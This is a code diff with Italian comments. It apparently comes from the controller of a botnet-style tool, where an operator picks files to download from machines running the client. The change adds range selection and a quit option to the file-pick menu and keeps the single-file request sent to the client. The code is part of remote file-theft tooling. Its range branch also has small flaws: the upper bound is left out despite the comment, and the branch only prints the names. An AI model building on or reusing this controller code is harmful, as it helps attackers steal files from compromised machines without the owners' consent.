@@ -126,17 +126,32 @@ async def ask_file_name_to_download(writer: asyncio.StreamWriter) -> None:
     """Gestione della richiesta del recupero di un file presente sulla macchina dove viene eseguito il client."""
     bot_master_utils.print_menu_with_list(content_dir, "Path disponibili:", 70)
     try:
+        operation_not_supported = "OPERATION_NOT_SUPPORTED"  # Testing nel caso in cui niente di quello inserito dall'utente matchi
         index = await ainput(">>> ")
-        request = int(index)
-        if 0 <= request < len(content_dir):
-            chosen_file = content_dir[request]
-            print(f"Operazione scelta {request} -> {chosen_file}")
-            writer.write(__response_options["8"].encode() + chosen_file.encode())
-            # TODO: Svuotare la lista nel caso in cui non si fosse chiesto il download di tutti i file
+        # Controlliamo che l'utente abbia richiesto un range di file
+        # Nel caso in cui l'utente voglia selezionare un range di file utilizziamo la forma <n-N> (es 0-10 per selezionare i file che hanno indici da 0 a 10)
+        if "-" in index:  # Utilizziamo come separatore <->
+            boundary = re.split('-', index)  # TODO: Aggiungere un campo all'interno di __response_options per la lista di file da scaricare (Per effettuare una singola chiamata)
+            for x in range(int(boundary[0]), int(boundary[1])):
+                print(f"File richiesto {content_dir[x]}")
+            bot_master_utils.info(f"Selezionato carattere di uscita <{index}>", 1)
+            writer.write(operation_not_supported.encode())
+
+        # Nel caso in cui l'utente non voglia scaricare file utiliziamo <q> come uscita
+        elif index == "q":
+            bot_master_utils.info(f"Selezionato carattere di uscita <{index}>", 1)
+            writer.write(operation_not_supported.encode())
+        # Negli altri casi invece selezioniamo un unico file
         else:
-            chosen_operation = "OPERATION_NOT_SUPPORTED"  # Testing nel caso in cui niente di quello inserito dall'utente matchi
-            writer.write(chosen_operation.encode())
-            await writer.drain()  # Attendiamo che venga eseguito il flush del writer prima di proseguire
+            request = int(index)
+            if 0 <= request < len(content_dir):
+                chosen_file = content_dir[request]
+                print(f"Operazione scelta {request} -> {chosen_file}")
+                writer.write(__response_options["8"].encode() + chosen_file.encode())
+                # TODO: Svuotare la lista nel caso in cui non si fosse chiesto il download di tutti i file
+            else:
+                writer.write(operation_not_supported.encode())
+                await writer.drain()  # Attendiamo che venga eseguito il flush del writer prima di proseguire
     except Exception as e:
         bot_master_utils.info(f"{type(e)}: {e}", 2)
 
